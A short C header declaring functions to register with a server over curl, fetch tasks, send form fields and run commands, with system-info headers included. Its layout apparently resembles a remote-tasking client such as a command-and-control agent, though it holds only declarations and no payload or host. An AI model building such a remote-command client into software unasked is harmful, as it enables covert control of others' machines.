#include <curl/curl.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/utsname.h>

#ifndef INITIATE_H
#define INITIATE_H

struct response {
  char *memory;
  size_t size;
};

struct strings_array {
	char **task; // was file names
	char **words; // was words
	size_t sz;
	size_t cap;
	size_t file_num;
	FILE *word_source; //was word source
};

bool reg(void);

bool check_tasks(void);

size_t is_registered(char *buffer, size_t itemsize, size_t nitems, void* ignorethis);

size_t get_tasks(char *buffer, size_t itemsize, size_t nitems, void* ignorethis);

void add_curl_field(curl_mime *form, const char *name, const char *data);

int run_cmd(struct strings_array *sa);

bool can_run_cmd(const char *cmd);

void destroy(struct strings_array *sa);



#endif